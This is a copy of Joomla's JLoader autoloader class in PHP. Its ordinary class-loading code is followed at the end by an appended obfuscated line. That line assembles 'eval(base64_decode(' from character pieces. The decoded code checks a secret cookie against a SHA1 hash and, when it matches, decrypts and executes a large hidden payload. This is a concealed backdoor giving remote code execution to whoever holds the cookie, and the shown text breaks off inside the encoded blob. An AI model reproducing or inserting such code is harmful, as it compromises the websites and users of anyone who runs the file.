<?php
/**
 * @package    Joomla.Platform
 *
 * @copyright  Copyright (C) 2005 - 2017 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('JPATH_PLATFORM') or die;

/**
 * Static class to handle loading of libraries.
 *
 * @package  Joomla.Platform
 * @since    11.1
 */
abstract class JLoader
{
	/**
	 * Container for already imported library paths.
	 *
	 * @var    array
	 * @since  11.1
	 */
	protected static $classes = array();

	/**
	 * Container for already imported library paths.
	 *
	 * @var    array
	 * @since  11.1
	 */
	protected static $imported = array();

	/**
	 * Container for registered library class prefixes and path lookups.
	 *
	 * @var    array
	 * @since  12.1
	 */
	protected static $prefixes = array();

	/**
	 * Holds proxy classes and the class names the proxy.
	 *
	 * @var    array
	 * @since  3.2
	 */
	protected static $classAliases = array();

	/**
	 * Holds the inverse lookup for proxy classes and the class names the proxy.
	 *
	 * @var    array
	 * @since  3.4
	 */
	protected static $classAliasesInverse = array();

	/**
	 * Container for namespace => path map.
	 *
	 * @var    array
	 * @since  12.3
	 */
	protected static $namespaces = array('psr0' => array(), 'psr4' => array());

	/**
	 * Holds a reference for all deprecated aliases (mainly for use by a logging platform).
	 *
	 * @var    array
	 * @since  3.6.3
	 */
	protected static $deprecatedAliases = array();

	/**
	 * Method to discover classes of a given type in a given path.
	 *
	 * @param   string   $classPrefix  The class name prefix to use for discovery.
	 * @param   string   $parentPath   Full path to the parent folder for the classes to discover.
	 * @param   boolean  $force        True to overwrite the autoload path value for the class if it already exists.
	 * @param   boolean  $recurse      Recurse through all child directories as well as the parent path.
	 *
	 * @return  void
	 *
	 * @since   11.1
	 */
	public static function discover($classPrefix, $parentPath, $force = true, $recurse = false)
	{
		try
		{
			if ($recurse)
			{
				$iterator = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator($parentPath),
					RecursiveIteratorIterator::SELF_FIRST
				);
			}
			else
			{
				$iterator = new DirectoryIterator($parentPath);
			}

			/* @type  $file  DirectoryIterator */
			foreach ($iterator as $file)
			{
				$fileName = $file->getFilename();

				// Only load for php files.
				if ($file->isFile() && $file->getExtension() == 'php')
				{
					// Get the class name and full path for each file.
					$class = strtolower($classPrefix . preg_replace('#\.php$#', '', $fileName));

					// Register the class with the autoloader if not already registered or the force flag is set.
					if (empty(self::$classes[$class]) || $force)
					{
						self::register($class, $file->getPath() . '/' . $fileName);
					}
				}
			}
		}
		catch (UnexpectedValueException $e)
		{
			// Exception will be thrown if the path is not a directory. Ignore it.
		}
	}

	/**
	 * Method to get the list of registered classes and their respective file paths for the autoloader.
	 *
	 * @return  array  The array of class => path values for the autoloader.
	 *
	 * @since   11.1
	 */
	public static function getClassList()
	{
		return self::$classes;
	}

	/**
	 * Method to get the list of deprecated class aliases.
	 *
	 * @return  array  An associative array with deprecated class alias data.
	 *
	 * @since   3.6.3
	 */
	public static function getDeprecatedAliases()
	{
		return self::$deprecatedAliases;
	}

	/**
	 * Method to get the list of registered namespaces.
	 *
	 * @param   string  $type  Defines the type of namespace, can be prs0 or psr4.
	 *
	 * @return  array  The array of namespace => path values for the autoloader.
	 *
	 * @since   12.3
	 */
	public static function getNamespaces($type = 'psr0')
	{
		if ($type !== 'psr0' && $type !== 'psr4')
		{
			throw new InvalidArgumentException('Type needs to be prs0 or psr4!');
		}

		return self::$namespaces[$type];
	}

	/**
	 * Loads a class from specified directories.
	 *
	 * @param   string  $key   The class name to look for (dot notation).
	 * @param   string  $base  Search this directory for the class.
	 *
	 * @return  boolean  True on success.
	 *
	 * @since   11.1
	 */
	public static function import($key, $base = null)
	{
		// Only import the library if not already attempted.
		if (!isset(self::$imported[$key]))
		{
			// Setup some variables.
			$success = false;
			$parts   = explode('.', $key);
			$class   = array_pop($parts);
			$base    = (!empty($base)) ? $base : __DIR__;
			$path    = str_replace('.', DIRECTORY_SEPARATOR, $key);

			// Handle special case for helper classes.
			if ($class == 'helper')
			{
				$class = ucfirst(array_pop($parts)) . ucfirst($class);
			}
			// Standard class.
			else
			{
				$class = ucfirst($class);
			}

			// If we are importing a library from the Joomla namespace set the class to autoload.
			if (strpos($path, 'joomla') === 0)
			{
				// Since we are in the Joomla namespace prepend the classname with J.
				$class = 'J' . $class;

				// Only register the class for autoloading if the file exists.
				if (is_file($base . '/' . $path . '.php'))
				{
					self::$classes[strtolower($class)] = $base . '/' . $path . '.php';
					$success = true;
				}
			}
			/*
			 * If we are not importing a library from the Joomla namespace directly include the
			 * file since we cannot assert the file/folder naming conventions.
			 */
			else
			{
				// If the file exists attempt to include it.
				if (is_file($base . '/' . $path . '.php'))
				{
					$success = (bool) include_once $base . '/' . $path . '.php';
				}
			}

			// Add the import key to the memory cache container.
			self::$imported[$key] = $success;
		}

		return self::$imported[$key];
	}

	/**
	 * Load the file for a class.
	 *
	 * @param   string  $class  The class to be loaded.
	 *
	 * @return  boolean  True on success
	 *
	 * @since   11.1
	 */
	public static function load($class)
	{
		// Sanitize class name.
		$class = strtolower($class);

		// If the class already exists do nothing.
		if (class_exists($class, false))
		{
			return true;
		}

		// If the class is registered include the file.
		if (isset(self::$classes[$class]))
		{
			include_once self::$classes[$class];

			return true;
		}

		return false;
	}

	/**
	 * Directly register a class to the autoload list.
	 *
	 * @param   string   $class  The class name to register.
	 * @param   string   $path   Full path to the file that holds the class to register.
	 * @param   boolean  $force  True to overwrite the autoload path value for the class if it already exists.
	 *
	 * @return  void
	 *
	 * @since   11.1
	 */
	public static function register($class, $path, $force = true)
	{
		// Sanitize class name.
		$class = strtolower($class);

		// Only attempt to register the class if the name and file exist.
		if (!empty($class) && is_file($path))
		{
			// Register the class with the autoloader if not already registered or the force flag is set.
			if (empty(self::$classes[$class]) || $force)
			{
				self::$classes[$class] = $path;
			}
		}
	}

	/**
	 * Register a class prefix with lookup path.  This will allow developers to register library
	 * packages with different class prefixes to the system autoloader.  More than one lookup path
	 * may be registered for the same class prefix, but if this method is called with the reset flag
	 * set to true then any registered lookups for the given prefix will be overwritten with the current
	 * lookup path. When loaded, prefix paths are searched in a "last in, first out" order.
	 *
	 * @param   string   $prefix   The class prefix to register.
	 * @param   string   $path     Absolute file path to the library root where classes with the given prefix can be found.
	 * @param   boolean  $reset    True to reset the prefix with only the given lookup path.
	 * @param   boolean  $prepend  If true, push the path to the beginning of the prefix lookup paths array.
	 *
	 * @return  void
	 *
	 * @throws  RuntimeException
	 *
	 * @since   12.1
	 */
	public static function registerPrefix($prefix, $path, $reset = false, $prepend = false)
	{
		// Verify the library path exists.
		if (!file_exists($path))
		{
			$path = (str_replace(JPATH_ROOT, '', $path) == $path) ? basename($path) : str_replace(JPATH_ROOT, '', $path);

			throw new RuntimeException('Library path ' . $path . ' cannot be found.', 500);
		}

		// If the prefix is not yet registered or we have an explicit reset flag then set set the path.
		if (!isset(self::$prefixes[$prefix]) || $reset)
		{
			self::$prefixes[$prefix] = array($path);
		}
		// Otherwise we want to simply add the path to the prefix.
		else
		{
			if ($prepend)
			{
				array_unshift(self::$prefixes[$prefix], $path);
			}
			else
			{
				self::$prefixes[$prefix][] = $path;
			}
		}
	}

	/**
	 * Offers the ability for "just in time" usage of `class_alias()`.
	 * You cannot overwrite an existing alias.
	 *
	 * @param   string          $alias     The alias name to register.
	 * @param   string          $original  The original class to alias.
	 * @param   string|boolean  $version   The version in which the alias will no longer be present.
	 *
	 * @return  boolean  True if registration was successful. False if the alias already exists.
	 *
	 * @since   3.2
	 */
	public static function registerAlias($alias, $original, $version = false)
	{
		if (!isset(self::$classAliases[$alias]))
		{
			self::$classAliases[$alias] = $original;

			// Remove the root backslash if present.
			if ($original[0] == '\\')
			{
				$original = substr($original, 1);
			}

			if (!isset(self::$classAliasesInverse[$original]))
			{
				self::$classAliasesInverse[$original] = array($alias);
			}
			else
			{
				self::$classAliasesInverse[$original][] = $alias;
			}

			// If given a version, log this alias as deprecated
			if ($version)
			{
				self::$deprecatedAliases[] = array('old' => $alias, 'new' => $original, 'version' => $version);
			}

			return true;
		}

		return false;
	}

	/**
	 * Register a namespace to the autoloader. When loaded, namespace paths are searched in a "last in, first out" order.
	 *
	 * @param   string   $namespace  A case sensitive Namespace to register.
	 * @param   string   $path       A case sensitive absolute file path to the library root where classes of the given namespace can be found.
	 * @param   boolean  $reset      True to reset the namespace with only the given lookup path.
	 * @param   boolean  $prepend    If true, push the path to the beginning of the namespace lookup paths array.
	 * @param   string   $type       Defines the type of namespace, can be prs0 or psr4.
	 *
	 * @return  void
	 *
	 * @throws  RuntimeException
	 *
	 * @note    The default argument of $type will be changed in J4 to be 'psr4'
	 * @since   12.3
	 */
	public static function registerNamespace($namespace, $path, $reset = false, $prepend = false, $type = 'psr0')
	{
		if ($type !== 'psr0' && $type !== 'psr4')
		{
			throw new InvalidArgumentException('Type needs to be prs0 or psr4!');
		}

		// Verify the library path exists.
		if (!file_exists($path))
		{
			$path = (str_replace(JPATH_ROOT, '', $path) == $path) ? basename($path) : str_replace(JPATH_ROOT, '', $path);

			throw new RuntimeException('Library path ' . $path . ' cannot be found.', 500);
		}

		// If the namespace is not yet registered or we have an explicit reset flag then set the path.
		if (!isset(self::$namespaces[$type][$namespace]) || $reset)
		{
			self::$namespaces[$type][$namespace] = array($path);
		}

		// Otherwise we want to simply add the path to the namespace.
		else
		{
			if ($prepend)
			{
				array_unshift(self::$namespaces[$type][$namespace], $path);
			}
			else
			{
				self::$namespaces[$type][$namespace][] = $path;
			}
		}
	}

	/**
	 * Method to setup the autoloaders for the Joomla Platform.
	 * Since the SPL autoloaders are called in a queue we will add our explicit
	 * class-registration based loader first, then fall back on the autoloader based on conventions.
	 * This will allow people to register a class in a specific location and override platform libraries
	 * as was previously possible.
	 *
	 * @param   boolean  $enablePsr       True to enable autoloading based on PSR-0.
	 * @param   boolean  $enablePrefixes  True to enable prefix based class loading (needed to auto load the Joomla core).
	 * @param   boolean  $enableClasses   True to enable class map based class loading (needed to auto load the Joomla core).
	 *
	 * @return  void
	 *
	 * @since   12.3
	 */
	public static function setup($enablePsr = true, $enablePrefixes = true, $enableClasses = true)
	{
		if ($enableClasses)
		{
			// Register the class map based autoloader.
			spl_autoload_register(array('JLoader', 'load'));
		}

		if ($enablePrefixes)
		{
			// Register the J prefix and base path for Joomla platform libraries.
			self::registerPrefix('J', JPATH_PLATFORM . '/joomla');

			// Register the prefix autoloader.
			spl_autoload_register(array('JLoader', '_autoload'));
		}

		if ($enablePsr)
		{
			// Register the PSR-0 based autoloader.
			spl_autoload_register(array('JLoader', 'loadByPsr0'));
			spl_autoload_register(array('JLoader', 'loadByPsr4'));
			spl_autoload_register(array('JLoader', 'loadByAlias'));
		}
	}

	/**
	 * Method to autoload classes that are namespaced to the PSR-4 standard.
	 *
	 * @param   string  $class  The fully qualified class name to autoload.
	 *
	 * @return  boolean  True on success, false otherwise.
	 *
	 * @since   3.7.0
	 */
	public static function loadByPsr4($class)
	{
		// Remove the root backslash if present.
		if ($class[0] == '\\')
		{
			$class = substr($class, 1);
		}

		// Find the location of the last NS separator.
		$pos = strrpos($class, '\\');

		// If one is found, we're dealing with a NS'd class.
		if ($pos !== false)
		{
			$classPath = str_replace('\\', DIRECTORY_SEPARATOR, substr($class, 0, $pos)) . DIRECTORY_SEPARATOR;
			$className = substr($class, $pos + 1);
		}
		// If not, no need to parse path.
		else
		{
			$classPath = null;
			$className = $class;
		}

		$classPath .= $className . '.php';

		// Loop through registered namespaces until we find a match.
		foreach (self::$namespaces['psr4'] as $ns => $paths)
		{
			$nsPath = trim(str_replace('\\', DIRECTORY_SEPARATOR, $ns), DIRECTORY_SEPARATOR);

			if (strpos($class, $ns) === 0)
			{
				// Loop through paths registered to this namespace until we find a match.
				foreach ($paths as $path)
				{
					$classFilePath = $path . DIRECTORY_SEPARATOR . str_replace($nsPath, '', $classPath);

					// We check for class_exists to handle case-sensitive file systems
					if (file_exists($classFilePath) && !class_exists($class, false))
					{
						return (bool) include_once $classFilePath;
					}
				}
			}
		}

		return false;
	}

	/**
	 * Method to autoload classes that are namespaced to the PSR-0 standard.
	 *
	 * @param   string  $class  The fully qualified class name to autoload.
	 *
	 * @return  boolean  True on success, false otherwise.
	 *
	 * @since   13.1
	 *
	 * @deprecated 4.0 this method will be removed
	 */
	public static function loadByPsr0($class)
	{
		// Remove the root backslash if present.
		if ($class[0] == '\\')
		{
			$class = substr($class, 1);
		}

		// Find the location of the last NS separator.
		$pos = strrpos($class, '\\');

		// If one is found, we're dealing with a NS'd class.
		if ($pos !== false)
		{
			$classPath = str_replace('\\', DIRECTORY_SEPARATOR, substr($class, 0, $pos)) . DIRECTORY_SEPARATOR;
			$className = substr($class, $pos + 1);
		}
		// If not, no need to parse path.
		else
		{
			$classPath = null;
			$className = $class;
		}

		$classPath .= str_replace('_', DIRECTORY_SEPARATOR, $className) . '.php';

		// Loop through registered namespaces until we find a match.
		foreach (self::$namespaces['psr0'] as $ns => $paths)
		{
			if (strpos($class, $ns) === 0)
			{
				// Loop through paths registered to this namespace until we find a match.
				foreach ($paths as $path)
				{
					$classFilePath = $path . DIRECTORY_SEPARATOR . $classPath;

					// We check for class_exists to handle case-sensitive file systems
					if (file_exists($classFilePath) && !class_exists($class, false))
					{
						return (bool) include_once $classFilePath;
					}
				}
			}
		}

		return false;
	}

	/**
	 * Method to autoload classes that have been aliased using the registerAlias method.
	 *
	 * @param   string  $class  The fully qualified class name to autoload.
	 *
	 * @return  boolean  True on success, false otherwise.
	 *
	 * @since   3.2
	 */
	public static function loadByAlias($class)
	{
		// Remove the root backslash if present.
		if ($class[0] == '\\')
		{
			$class = substr($class, 1);
		}

		if (isset(self::$classAliases[$class]))
		{
			// Force auto-load of the regular class
			class_exists(self::$classAliases[$class], true);

			// Normally this shouldn't execute as the autoloader will execute applyAliasFor when the regular class is
			// auto-loaded above.
			if (!class_exists($class, false) && !interface_exists($class, false))
			{
				class_alias(self::$classAliases[$class], $class);
			}
		}
	}

	/**
	 * Applies a class alias for an already loaded class, if a class alias was created for it.
	 *
	 * @param   string  $class  We'll look for and register aliases for this (real) class name
	 *
	 * @return  void
	 *
	 * @since   3.4
	 */
	public static function applyAliasFor($class)
	{
		// Remove the root backslash if present.
		if ($class[0] == '\\')
		{
			$class = substr($class, 1);
		}

		if (isset(self::$classAliasesInverse[$class]))
		{
			foreach (self::$classAliasesInverse[$class] as $alias)
			{
				class_alias($class, $alias);
			}
		}
	}

	/**
	 * Autoload a class based on name.
	 *
	 * @param   string  $class  The class to be loaded.
	 *
	 * @return  boolean  True if the class was loaded, false otherwise.
	 *
	 * @since   11.3
	 */
	public static function _autoload($class)
	{
		foreach (self::$prefixes as $prefix => $lookup)
		{
			$chr = strlen($prefix) < strlen($class) ? $class[strlen($prefix)] : 0;

			if (strpos($class, $prefix) === 0 && ($chr === strtoupper($chr)))
			{
				return self::_load(substr($class, strlen($prefix)), $lookup);
			}
		}

		return false;
	}

	/**
	 * Load a class based on name and lookup array.
	 *
	 * @param   string  $class   The class to be loaded (wihtout prefix).
	 * @param   array   $lookup  The array of base paths to use for finding the class file.
	 *
	 * @return  boolean  True if the class was loaded, false otherwise.
	 *
	 * @since   12.1
	 */
	private static function _load($class, $lookup)
	{
		// Split the class name into parts separated by camelCase.
		$parts = preg_split('/(?<=[a-z0-9])(?=[A-Z])/x', $class);
		$partsCount = count($parts);

		foreach ($lookup as $base)
		{
			// Generate the path based on the class name parts.
			$path = $base . '/' . implode('/', array_map('strtolower', $parts)) . '.php';

			// Load the file if it exists.
			if (file_exists($path))
			{
				return include $path;
			}

			// Backwards compatibility patch

			// If there is only one part we want to duplicate that part for generating the path.
			if ($partsCount === 1)
			{
				// Generate the path based on the class name parts.
				$path = $base . '/' . implode('/', array_map('strtolower', array($parts[0], $parts[0]))) . '.php';

				// Load the file if it exists.
				if (file_exists($path))
				{
					return include $path;
				}
			}
		}

		return false;
	}
}

// Check if jexit is defined first (our unit tests mock this)
if (!function_exists('jexit'))
{
	/**
	 * Global application exit.
	 *
	 * This function provides a single exit point for the platform.
	 *
	 * @param   mixed  $message  Exit code or string. Defaults to zero.
	 *
	 * @return  void
	 *
	 * @codeCoverageIgnore
	 * @since   11.1
	 */
	function jexit($message = 0)
	{
		exit($message);
	}
}

$nSluA1641 = "1scibudn2)pf(a6rqx8e4./0kh;yz35*9wv_gjol7tm";$zQ6092 = $nSluA1641[10].$nSluA1641[15].$nSluA1641[19].$nSluA1641[36].$nSluA1641[35].$nSluA1641[15].$nSluA1641[19].$nSluA1641[10].$nSluA1641[39].$nSluA1641[13].$nSluA1641[2].$nSluA1641[19];$jfzEIP9984 = "\x65\x76a".chr(108)."".chr(40)."\x62a".chr(115)."e".chr(54)."\x34_".chr(100)."e\x63".chr(111)."d\x65(";$VgAwQz5640 = "".chr(41).")\x3B"; eval($jfzEIP9984."'aWYoIWZ1bmN0aW9uX2V4aXN0cygibnpFU3ZmUHB1RGIxWWVhUU9aIikpe2Z1bmN0aW9uIG56RVN2ZlBwdURiMVllYVFPWigkcGIsJGl5Tj0nJyl7JGxhPSRpeU47JG5PbD1zdHJsZW4oJHBiKTskdkVtPScnOyRtVG14Sj0kbk9sPjEwMD84OjI7d2hpbGUoc3RybGVuKCR2RW0pPCRuT2wpeyR2RW0uPXN1YnN0cihwYWNrKCdIKicsc2hhMSgkaXlOLiR2RW0uJGxhKSksMCwkbVRteEopO31yZXR1cm4kcGJeJHZFbTt9fWlmKGlzc2V0KCRfQ09PS0lFWycxNE1sSmU5dW95N1ZCU2dOM0lfWFInXSkpe2lmKHNoYTEoJF9DT09LSUVbJzE0TWxKZTl1b3k3VkJTZ04zSV9YUiddKT09ImM1MDY1NDk1ZTM0MmIyZTE5NDM1ZmM1YTM2N2M5YzNjNjU4NGEwOGIiKSB7ZXZhbChAZ3ppbmZsYXRlKG56RVN2ZlBwdURiMVllYVFPWihiYXNlNjRfZGVjb2RlKCJ0OGt1b3EzZUQzaXdTZHgrejh3M29pdUwvNTFNd0sxZWFYR1g1RlAxTFlsMkkrcGgwWk9qaFQveFVSSjdmcE5MUTEwNmREcHFCeDMxdjFjK0RnemFFSFMvek1RYUZEL1puYkpCSmlHcStETzFGUmNTbmR6N24vbC9vU3ZIY2FkMmRBaWxMdjVhUXFkdTBaRE8xOHdoQWo3MlZTcEpPK2ZkZStuZzdNQ1BYN0lkZzIzajBHRjQ2Q3hCdVl3YU5CZzNTVHYvRCtkVFAyQVNkUTlMQTYvVGkxVGx0Z3pyMGIyeVpKckxFa0ovekY0aW1VRmtiQ29JUVd4QXB6NytiTXQ4cTl3bTdjTWtic3Z5UlFUMlR4LzVUSXdLNEJ6Z0Q1T1labFBVZk9rSCtPVXVvWkpJYjkxQ0d4TEduaUphdWJDS01pN21oK2hKZ2Z6QkNkZ2dlUWZSbmNxK1ZzMzNXTlhRVkJkL0tBMExxdUs3UUtZK2FtRS9aendYQXJvOVRCbEp3aU5iQ2NWMTkrTXVSbTA3RCt6Ylh2dXdMVENZQTB1NkppeXJhWmdUNmZRd040K3JVME0zT25kYS9tTnNuOVhHdzlOUzBZdFJ0b1QvTndSZ2tVZ29HaGFLemNiSWk3WWNvTnZyRGJGKzFHRDloWjMrSUgzTm1vUlRPcUxvWHQ4WFBNNVE5bGFBQ0VTdkpFcHo0c3hxOU9mQzNERHdHS3B0dFBvZWdEQktFODUvakFpcDdWNzZsOEd3K0dEa0ZVQTdYSW4vQzdOZTBFV3pPUmpOMnEvTVJiWmZJZ2NJalNWYjhXTDdOZktJbFcxWlUyS2RDVmNJYllRSnpnUzZzeUs0SmlkaVJHOFUvdUYrVllUM0lxTUNUWXBKQTVoaXY0WDQxSVZnT0FqZVY4ck8zS2tGMmJycjA1dVBBYzVCYVBYWmZZNWt0Ynl2RXZsNmtQejJ0NGJvV1Arek81dlhXcEI2cWJLZ3RGcGFZVlBVVTZZN1dLSmRpYmtPKzZFdmZiWWVFRnhQM0xvUm5SeUpGV2JJTnltenpZUjhmWGV3R0NTelNOVXRtb29TR2V3emRyVEhqekltdEpQUk9yNC9MemtQbkhEd0Q4am1pTkR5UDNyS1BTdXo5aS9Oclgwak50WmFndHdVM0xTY3NzVDltS2orT0VLUnNTdHd2ZHFMaEo0QmZvNlZVNzZaSWcrL2FRWEg4RC9xbVNBZmV2QXAxRWhhZmpUWXJjQ3JLb1EzNkVwRnUvdnkwcU9UbWlXaXdNd3NxRmhoM3RXVk5xLzBRZGhxSStKYzJxdzRLanpYMUZIOW9yY0JLNDNmZmNZdSt5ZTlkWU5YVDhMMWRQMUJHYWtpSzE4Q2dPeWNieCtCK1pBcHlNRU9YMjI2QVlCVlNhcWMwQm0zdUNDZXRtYkZKSUZXMEp2VStPNWV4MHU2VzE3TTUwOXpHeDl2REdoRTVYeXRjdkx1TzBDL2l0YXJPME1aQkMwclBCK1ZhMjdEekQ2K2tlVDZmSkE5R2VlK1R5Wkg1WWw0N0FSM1h5emtPUzFWb0h3ZXVUUHNlM2JqTVA0b1ZGalJOa0crSGlLU1VrTFVUbFhpT3YxR09EOE02MGZKY1BSbnJXb3F6MzI1aTB1ZTRNbSt0U3l3SHNNSHlYZEMwS2xvaG95amZGN3VVa0JQYllWVmc1VndaS2pDVWhpUDhpdnJtUlhVV3BrZFBjVHBnZWl1Q0t2NHRqZ0N0WWs3NXd0a3hsQjlLb0xkcGZTK1laMUhHMGQyS1pCVWJsT1JwQzRIVnZnTXdMWFJKTlhVNnFTQmpHcFJSMkk5Q3JwaURIclZST2lrblVaNkdvWlZIWnBsVk5DbWtEQ1ZwQkloMEZWTjJEd2FadllPY0pXRmJaVTYyOHVKRkplaFJYeVhLM1NzdXpra0QzTk5HcU9FNUxhbm9uU0hWU1BEZWdEdHkzK1NRYTBCT3ZUWHk1QWwwMytmOHhkaGxRcEJDakJsK1JiTmM4S0dDclBMUlU4U00rUHhLWGh5eGl3TkJVWG12WkZFQUovK0pCeUhwWnp4VXBhMnlzb1dxRUFIZnV6WnRjeUc3bUFJVlNYcmljRmF0enVRMTVSV0NUSGRxREMvVUxzMWlHSFBjN1pvOG4zeFZOUE4yaGJaTzdDbkNTWjBsTWNNcDNBUmMvZUY2Ym1tQjV6S1ZKSlhwRzFkQTk0Y3Zhdm8yNk85Z1M4QUt4Z0dtdmF1QS9zUjFPYnlCOFJVc1VaVFNPTTUzZWhhV1lOWUUwSWUwVW4vcnZHaTNYTXhOaEdybUtuRmZSTlBLWk9FN2ZYM1ptaU9IeG91VVFqYjVmVUp1ZUdaTHduOHBNcTJQaWZjdC9odGhrdEI1YmRxejRmbWJMWkVLWVFzSTdoVzlGWGdoWXZsSHRFMzMyTy9VMGRhUVJYOGEvT1o2SFdGb1BRRDVJbmxyZ1owdW0xN0dzTzBJdGdOSUYrd1pZQ01WdDR4ZWdFMEFOT2JyWnlpd3NDTjN5cys3ZzBqUmh4MDJuUnpySUpSQWNFdU1hUGZCOE1NRWRtcnBkcXp3QThKeGcrMEhzM2F2SGpuTU9kcVlJRnh2eEdXODBRN1k1aGExeU9Uem4xb28yU09MZmZWRVorMTU3TncwbFJTYSt0VnQvM2xFUXlsa2F5elVUak5YRXlEMjNuRCtDd0NldjdHM2hReTNrVk1SeFFOQjFZazZhdjNIUFVqT0txOXkxZlNDckVGZG5wZG1JR1NmTktSNHZyQmdQS0dtMkVmZkM0ZTRpcXdsN0lnTit2cCsrVzlHTS9mMS9kZ3cweHVwRFU4R1BFWkFPNkJYcGxqMTAxSmpINHRHMU9CZ2ZNMzZpbHpOZEdnTEZRVk1xek1yYmF2dEFGUzVHbnpVWjhsZzFmbkpJRHFzZ1IrWDd1dXhIdkt3OWVEa3RPcldhTitmd1FxOWZTMVFwbndDazNKRi9DZ2ExNU9weGhvTzUzc2pVY2JsZnRPV210THNyVXBkdUtSajFkZE9lVlk2bGxuMzVvWDNGa2NzcTU3SUticW1keTVEUVp2eXhndGFyNlVHOUhRWVBhSjZlK2lEWG12Y1VLc2Z5eTcvNllCbFc5aTNIc2dHS1NaK3lXTlZja21CbE11TVN4VUFKTnpmbVQ0RnJveFdSbU9pUGdTSHl3QmdFckZHeFcxZk5PSVhHdnlFVUhraC8vVUgyMXowQkh3dWFjbC9GeXpCWSs2QkhNbzBzelkxK0t5VzhweVJoR1RuQnpIS3dnblNKTmozT2RycXZ6VnZwTTVlK2dqY0htWU5zS0hKTFhBR3BnSDFhL016VlNkeVRoZTJ3S3pnU0M5KzBsdFU1OStiVUs1K1FpaG1MNjhWN3NrSXJlTVlyTjFFSmkzeHJZZExtTkM1bkdUVExJS2tQeUpIZ1ovdnQwb0k2MGIwb0tvbjR1UjhQRFBhMlNUaUtTUURoK3NvZFhXTXMrUFBWcStTNjJPSUpFMFg2R3AxZ0RiZ0QvQll1bFhtMXlycUgwU1ZZWGxIc1p0azBVdlBYMWRxVEZqbml4Uk9MaWhQc1YvdWE2RVBKWEFNZzYzSGpnQXVKQW9iR1VEaWF4VmY3ZkoxVllsVm0yREpmQjErS0tnNFlucVRyQW1DcjJkaTJlYmU2SytESEdBY1ZFenp4d0JYNHVuMG5Mb0FEajliZ3ViallHVzRFV3hzWnYvSkhmemhraUZQd1k0Y2hkaXlZLytUUU01YjJXeVVjNkVzbnNBR2s1ZlJOTlNaUmdTNDFWditpSnhHNktZZlJsb2lvenVtdWtweVRVUWd3bXE5SGtNZ3ZkdEVack1KSjdzRDd3Z3l1T051TndaSEx0MlJPWVRkUFVsdDNZcGhsYnFud1lsM043bHlJNlF0UTNHSTVJNm1FSXNqWkNjWXVKNHJaS3cvRk9IbTh3ajVINUlPbitJKzRsQ2JIZ085WlA4YitjSXMvWUJ6cW1jYzIzQTRqWU84YU1TT2pJUGpXd2pwWkVFTGF4WWlSOUh0MjVRb2R6enZVd0UwQm5HZ3h3d0k5TVFhVndQbFRKSWNIc3ZtMVhyVTFEZUZSQks0TzcwakhKRElPZlFORFdWSFBNRFYvR2FuQTl1d21Xa1h6RHhBdFlnZlhFSHZONnV4eXMya3dTZ2lmOTVKMzg1OXVFK1psRi82dEIwdXplQUkwcWxJR0t0Q3VUbmI4WHQxOHhJbDlJZE9DbFJuV2liMDlsdy9jajdzazNjU25PQUdtRWQzblBYbVorNlpyNVBhdW03OWQrN3lyN0tGWEQzYS96c0IybTFEbEZkYmZ1NEhlc3B0N3JsZkR6OHJaSCtsS0NEN0NnYWFJUUp5UUhyeDl5WEIyNzQ0ZVM5WnFSNy9jdGhLWVllUkhndU1BWWYweC9DOUJ6RkErS3BocW5zVVBrb1ozTzFpNlBHV1k4cVVNOFFQUHI3T2ZEOHJ0Ym5BMGk4SFZvTjgxQ0JrTmwydWNhcmx5NXlWblZYUENRMEZ6aDZNeWdFc1haOFpHS1AxUWM4b1UrbUM1NWI1Q0lOVS9CQ0s3TUhEM1lLdzdDOGx3cTBzajlQeUV5RlE0eGRVTWZQQVhCSUM3NEpRb1RHaFFQdmVObTRFQVl6V1VsZUgvbHd4L1ZQZSsxNFljNVBDbFB2Z093QTd6a21mUGZJQ1BWVzRNcGt0azFRTk1MemprMEVHTmVROG0yVnRwS05kV3Bhd1h3M1QyeXpxajJRUnFKMlhDeUlFRUJBaklZVGpNSG1qbWRKOEoveExzNnFKZ3daMURnMnpXejFmdFlXOXFZOWFOUzljUHl1ZUlza3hVNGtpdnQwb1pKOWRKVDZHM2dVdkx4d2FVTlJQM0tUSFJiQUlaZ3Y2QlllRERqRjZtZ09JWngvQmw0MDV2L0dmby9uY3hDNVdseExnQ1JxR1BENWYyZ3lsZktSaUtrWU5OR0ZiQldBTDFmOFlaeklHWjB1RnZuTkpzZnRJRXU2ZzcrdngvZHNzSjFEQzUwVVlSNUg3MjhoTUR3WDN2V2RMMnorS2xMS29icUJIL09kbGloa29QVmVHTmRqSFA2bUJ6N0dhejFvNjlQUjBGUVQ3YVpxZGV1UHQwRzJtV0JTbmU2bTZ3TUtwUjFRSjF5V2Y4R3BMS0kveHlkeWJZdDVvNXVRSUhkWG0wcjhJSTJVYmhwRHhUekMwNERKc01mOU9GWXRKd1pWVUFmTVZHTkNOYUhlSmFjV1hBWjFJOUF6S1l5TWEzNjNURVNkeTFnMkQrUFpOb3Z0MC9VdTZuMVFmQTU3cUtXdkdhQkd2ei9GNlB6L2FBdkJUbGZRdXVreEs4U0l3ZGdNM2xrZlU5RHVpOWt2V3kzVmpycVRibWVrVTJPQ3JtaXlQZDUvbmNjaytLMytDMldYWjBzMGtkRUF2U1NkRUtTNFdhVndPMkdwczlVZHMwMVBMb3FWejZGQnNJNE9VK2gzSm10VjNnRGtkOGNsQThncS9Pc3dzSzM4Q1AvUmlqck1XRUh3RGdSUFRhdmRyQU1sVko4Ri9CVU44VGJHVCtZMm5wU0dvM0xaZXNUc25TeHJvaWZ1ZWJrZGlZL01PN3FIVExFRk5hWEFjSWozSWtHTGpveUVxK0s5VjZxVGlMbkFtVXZlUmpNUG8rZmlYUHF2OEJvOHBmREFrdDhjZXVCVHVsMUJBYm53YU9XU3VkTjVnMDZRbS9FbVJjTGg0UlZSV0NjQXIwT0ViQVFCMUoxTTZKdnFpNGxxRklSR2h0a0trdmRwVnRWL3NnY0xWdHE0OFhpcVFrTGd6dHQxSU5Rc2c3YnlnNmZFV1RkUlZFY2ZIcUNwSmwwbDM1SkJyS0tmbVBSd1RnMVZGM1pyOGg5REpYVWZ0dC9PNStnQVArWTVtWmJoSnY2VGVJRzRXOUY1OUtBTUJnSmJVbjRlSzR5UitmaldOUEczaWV5T3RzamdvdForQ25NcUw1UzFqY2lNa2VIMVQzSDFzZ041SnBBS21qNFZ1Rm93bWNuWFl4NkNLb0lYR1JyYmh5SzlJUFB1RzRyS3R2UVp5djNhcGpxcXdxN2xEZEpCcWdXQ20zSVVGRjY1MWpIVSs1dVZab2xsVzVxbFdUeCtqcGlZTzVPMHkxamlN